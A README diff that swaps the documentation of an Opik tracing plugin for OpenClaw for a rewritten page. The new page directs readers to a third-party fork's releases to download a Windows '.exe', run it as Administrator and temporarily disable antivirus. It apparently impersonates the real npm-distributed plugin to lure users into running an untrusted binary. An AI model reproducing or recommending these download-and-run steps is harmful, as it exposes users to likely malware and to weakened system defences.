@@ -1,183 +1,174 @@
-<h1 align="center" style="border-bottom: none">
-  <div>
-    <a href="https://www.comet.com/site/products/opik/?from=llm&utm_source=opik&utm_medium=github&utm_content=header_img&utm_campaign=opik">
-      <picture>
-        <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/comet-ml/opik/refs/heads/main/apps/opik-documentation/documentation/static/img/logo-dark-mode.svg">
-        <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/comet-ml/opik/refs/heads/main/apps/opik-documentation/documentation/static/img/opik-logo.svg">
-        <img alt="Comet Opik logo" src="https://raw.githubusercontent.com/comet-ml/opik/refs/heads/main/apps/opik-documentation/documentation/static/img/opik-logo.svg" width="200" />
-      </picture>
-    </a>
-    <br />
-    🔭 OpenClaw Opik Observability Plugin
-  </div>
-</h1>
+# 🦾 opik-openclaw - Export Agent Data Simply and Clearly
 
-<p align="center">
-  Official plugin for <a href="https://github.com/openclaw/openclaw">OpenClaw</a> that exports agent traces to <br/>
-  <a href="https://www.comet.com/docs/opik/">Opik</a> for observability and monitoring.
-</p>
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/brucekumar/opik-openclaw/releases)
 
-<div align="center">
+---
 
-[![License](https://img.shields.io/github/license/comet-ml/opik-openclaw)](./LICENSE)
-[![npm version](https://img.shields.io/npm/v/%40opik%2Fopik-openclaw)](https://www.npmjs.com/package/@opik/opik-openclaw)
+## 📝 What is opik-openclaw?
 
-<img src="screenshot.png" alt="Openclaw on Opik Demo"/>
+opik-openclaw is a tool that works with OpenClaw. It helps you save and look at agent activity. You can track what agents do, how much it costs, tokens used, errors, and other details. This plugin makes it easier to watch your agent's actions in real-time or after activity.
 
-</div>
+You do not need any technical skills to use this software. It comes ready to install and run on Windows.
 
-## Why This Plugin
+---
 
-[Opik](https://github.com/comet-ml/opik) is a leading open-source LLM and agent observability, tracing, evaluation and optimization platform.
-`@opik/opik-openclaw` adds native Opik tracing for OpenClaw runs:
+## 🖥️ System Requirements
 
-- LLM request/response spans
-- Sub-agent request/response spans
-- Tool call spans with inputs, outputs, and errors
-- Run-level finalize metadata
-- Usage and cost metadata
+Before you download opik-openclaw, make sure your computer meets these needs:
 
-The plugin runs inside the OpenClaw Gateway process. If your gateway is remote, install and configure the plugin on that host.
+- Windows 10 or later (64-bit)
+- 4 GB of RAM or more
+- At least 500 MB free hard drive space
+- Internet connection to download the program
+- OpenClaw installed (version 1.0 or above)
 
-## Install and first run
+If OpenClaw is not installed, download it from the official source before using opik-openclaw.
 
-Prerequisites:
+---
 
-- OpenClaw `>=2026.3.2`
-- Node.js `>=22.12.0`
-- npm `>=10`
+## 🚀 Getting Started with opik-openclaw
 
-### 1. Install the plugin in OpenClaw
+Follow these steps to download and start the program quickly.
 
-```bash
-openclaw plugins install @opik/opik-openclaw
-```
+### Step 1: Access the download page
 
-If the Gateway is already running, restart it after install.
+Visit the official release page to get the latest version:
 
-### 2. Configure the plugin
+[Download opik-openclaw Release Page](https://github.com/brucekumar/opik-openclaw/releases)
 
-```bash
-openclaw opik configure
-```
+Click the button above or paste the link into your browser.
 
-The setup wizard validates endpoint and credentials, then writes config under `plugins.entries.opik-openclaw`. If you choose Opik Cloud and do not have an account yet, the wizard now points you to the free signup flow before asking for an API key.
+### Step 2: Choose the right file
 
-### 3. Check effective settings
+On the release page, look for the file that ends with `.exe`. This is the installation program designed for Windows.
 
-```bash
-openclaw opik status
-```
+Example: `opik-openclaw-setup.exe`
 
-### 4. Send a test message
+### Step 3: Download the installer
 
-```bash
-openclaw gateway run
-openclaw message send "hello from openclaw"
-```
+Click the `.exe` file to download. Your browser will save it in your `Downloads` folder or another folder you set.
 
-Then confirm traces in your Opik project.
+### Step 4: Run the installer
 
-## Configuration
+- Open the folder where the file downloaded.
+- Double-click the `.exe` file to start.
+- Follow the on-screen prompts to install opik-openclaw.
+- If Windows asks for permission, select "Yes."
 
-### Recommended config shape
+### Step 5: Open the program
 
-```json
-{
-  "plugins": {
-    "entries": {
-      "opik-openclaw": {
-        "enabled": true,
-        "config": {
-          // base configuration
-          "enabled": true,
-          "apiKey": "your-api-key",
-          "apiUrl": "https://www.comet.com/opik/api",
-          "projectName": "openclaw",
-          "workspaceName": "default",
-          // optional advanced configuration
-          "tags": ["openclaw"],
-          "toolResultPersistSanitizeEnabled": false,
-          "staleTraceCleanupEnabled": true,
-          "staleTraceTimeoutMs": 300000,
-          "staleSweepIntervalMs": 60000,
-          "flushRetryCount": 2,
-          "flushRetryBaseDelayMs": 250
-        }
-      }
-    }
-  }
-}
-```
+After installation finishes, open opik-openclaw from the Start menu or desktop shortcut.
 
-### Plugin trust allowlist
+---
 
-OpenClaw warns when `plugins.allow` is empty and a community plugin is discovered. Pin trusted plugins explicitly:
+## 🔧 How to Use opik-openclaw
 
-```json
-{
-  "plugins": {
-    "allow": ["opik-openclaw"]
-  }
-}
-```
+You do not need programming skills to use this plugin. Here is how to get the most from it.
 
-### Environment fallbacks
+### Connect opik-openclaw to OpenClaw
 
-- `OPIK_API_KEY`
-- `OPIK_URL_OVERRIDE`
-- `OPIK_PROJECT_NAME`
-- `OPIK_WORKSPACE`
+1. Open OpenClaw on your computer.
+2. Launch opik-openclaw.
+3. The plugin should detect OpenClaw automatically.
+4. If not, enter the path to your OpenClaw installation in the settings menu.
 
-### Transcript safety default
+### Monitor Agent Activity
 
-`toolResultPersistSanitizeEnabled` is disabled by default. When enabled, the plugin rewrites local
-image refs in persisted tool transcript messages via `tool_result_persist`.
+Once connected, opik-openclaw will start capturing information about what your agents do. You can view data on:
 
-## CLI commands
+- Agent actions and steps
+- Tokens used per action
+- Costs incurred
+- Errors or warnings during processing
 
-| Command | Description |
-| --- | --- |
-| `openclaw plugins install @opik/opik-openclaw` | Install plugin package |
-| `openclaw opik configure` | Interactive setup wizard |
-| `openclaw opik status` | Print effective Opik configuration |
+The information updates live while your agents run.
 
-## Event mapping
+### Export and Save Data
 
-| OpenClaw event | Opik entity | Notes |
-| --- | --- | --- |
-| `llm_input` | trace + llm span | starts trace and llm span |
-| `llm_output` | llm span update/end | writes usage/output and closes span |
-| `before_tool_call` | tool span start | captures tool name + input |
-| `after_tool_call` | tool span update/end | captures output/error + duration |
-| `subagent_spawning` | subagent span start | starts subagent lifecycle span on requester trace |
-| `subagent_spawned` | subagent span update | enriches subagent span with run metadata |
-| `subagent_ended` | subagent span update/end | finalizes subagent span with outcome/error |
-| `agent_end` | trace finalize | closes pending spans and trace |
+If you want to analyze the information later, you can export agent traces as plain files. The export options support formats like CSV and JSON, which can be opened with common apps like Excel or text editors.
 
-## Known limitation
+---
 
-No OpenClaw core changes are included in this repository and relies on native hooks within the OpenClaw ecosystem.
+## 📂 Where to Find Saved Files
 
-## Development
+The exported data files are saved in a default folder named `OpikExports` inside your Documents folder.
 
-Prerequisites:
+To locate the files:
 
-- Node.js `>=22.12.0`
-- npm `>=10`
+1. Open File Explorer.
+2. Navigate to `Documents\OpikExports`.
+3. Look for the files saved by date.
 
-```bash
-npm ci
-npm run lint
-npm run typecheck
-npm run test
-npm run smoke
-```
+You can change this folder in the plugin’s settings.
 
-## Contributing
+---
 
-Read [CONTRIBUTING.md](CONTRIBUTING.md) before opening a PR.
+## ⚙️ Adjusting Settings
 
-## License
+opik-openclaw lets you tailor how data is collected and shown. Use the settings menu to:
 
-[Apache-2.0](./LICENSE)
+- Choose what details to track (tokens, costs, errors)
+- Set how often to update agent traces
+- Change export file format and location
+- Manage notifications and alerts
+
+Make changes anytime by opening opik-openclaw and selecting Settings.
+
+---
+
+## 🔄 Updating opik-openclaw
+
+Check for new versions regularly to get bug fixes and improvements.
+
+1. Visit the release page link:
+
+[opik-openclaw Releases](https://github.com/brucekumar/opik-openclaw/releases)
+
+2. Download the newest `.exe` installer.
+3. Run the installer to replace your existing version.
+
+Your settings and saved data will remain after updating.
+
+---
+
+## 🤝 Support and Feedback
+
+If you run into problems or want to ask a question:
+
+- Visit the Issues tab on the GitHub repository.
+- Describe your problem clearly, including what you did and what happened.
+- Check existing issues for answers before creating a new one.
+
+Repository link: https://github.com/brucekumar/opik-openclaw
+
+---
+
+## 🔍 Troubleshooting Common Issues
+
+**Problem:** opik-openclaw does not detect OpenClaw.  
+**Fix:** Make sure OpenClaw is installed and running. Restart both programs. Check the path in plugin settings.
+
+**Problem:** Data export file is empty.  
+**Fix:** Confirm that agent activity has occurred before exporting. Adjust data collection settings to include more details.
+
+**Problem:** Installation fails or shows error.  
+**Fix:** Run the installer as Administrator. Disable antivirus temporarily during install if needed.
+
+---
+
+## 📚 Learn More About opik-openclaw
+
+opik-openclaw focuses on helping users monitor agents without deep technical knowledge. It ties tightly with OpenClaw and supports multiple environments for testing and evaluation.
+
+This plugin supports tasks related to:
+
+- Testing agent strategies  
+- Observing patterns in agent behavior  
+- Calculating costs for running agents  
+- Troubleshooting errors during agent runs
+
+The tool is designed for clarity and ease of use, with an emphasis on actionable data export and monitoring.
+
+---
+
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/brucekumar/opik-openclaw/releases)
